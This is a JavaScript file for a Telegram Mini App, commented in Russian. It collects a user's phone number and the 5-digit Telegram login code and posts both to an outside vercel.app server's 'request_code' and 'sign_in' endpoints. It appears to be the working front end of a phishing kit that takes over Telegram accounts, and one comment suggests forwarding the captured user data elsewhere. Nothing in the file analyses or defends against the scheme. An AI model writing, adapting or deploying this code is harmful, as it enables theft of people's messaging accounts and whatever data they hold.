// Очень упрощённый пример, в реальности добавляют больше проверок

const tg = window.Telegram.WebApp;
tg.ready();
tg.expand();

const API_BASE = "https://telegram-api-ashen.vercel.app/api";  // ← сюда реальный адрес

let currentPhone = "";

const phoneInput = document.getElementById("phone");
const btnNext = document.getElementById("btn-next");
const phoneDisplay = document.getElementById("phone-display");
const codeInputs = document.querySelectorAll(".code-input");
const btnSubmit = document.getElementById("btn-submit");

let code = "";

// Переключение шагов
function showStep(id) {
  document.querySelectorAll(".step").forEach(el => el.classList.remove("active"));
  document.getElementById(id).classList.add("active");
}

// Автофокус и переход между полями кода
codeInputs.forEach((input, idx) => {
  input.addEventListener("input", e => {
    const val = e.target.value.replace(/\D/, "");
    e.target.value = val;
    if (val && idx < 4) {
      codeInputs[idx + 1].focus();
    }
    code = Array.from(codeInputs).map(i => i.value).join("");
    btnSubmit.disabled = code.length !== 5;
  });

  input.addEventListener("keydown", e => {
    if (e.key === "Backspace" && !input.value && idx > 0) {
      codeInputs[idx - 1].focus();
    }
  });
});

// Шаг 1 — запрос кода
btnNext.onclick = async () => {
  const phone = phoneInput.value.trim();
  if (!phone.startsWith("+") || phone.length < 10) {
    alert("Введите корректный номер");
    return;
  }

  currentPhone = phone;
  phoneDisplay.textContent = phone;

  showStep("loading");

  try {
    const r = await fetch(`${API_BASE}/request_code`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-Telegram-Web-App-InitData": tg.initData
      },
      body: JSON.stringify({ phone })
    });

    const data = await r.json();

    if (data.ok) {
      showStep("step-code");
      codeInputs[0].focus();
    } else {
      alert(data.error || "Ошибка запроса кода");
      showStep("step-phone");
    }
  } catch (err) {
    alert("Ошибка сети");
    showStep("step-phone");
  }
};

// Шаг 2 — отправка кода
btnSubmit.onclick = async () => {
  showStep("loading");

  try {
    const r = await fetch(`${API_BASE}/sign_in`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "X-Telegram-Web-App-InitData": tg.initData
      },
      body: JSON.stringify({
        phone: currentPhone,
        code: code
      })
    });

    const data = await r.json();

    if (data.ok) {
      showStep("success");
      // Можно отправить данные дальше куда нужно
      console.log("Успешный вход:", data.user);
    } else {
      alert(data.error || "Неверный код");
      showStep("step-code");
    }
  } catch (err) {
    alert("Ошибка сети");
    showStep("step-code");
  }
};

showStep("step-phone");
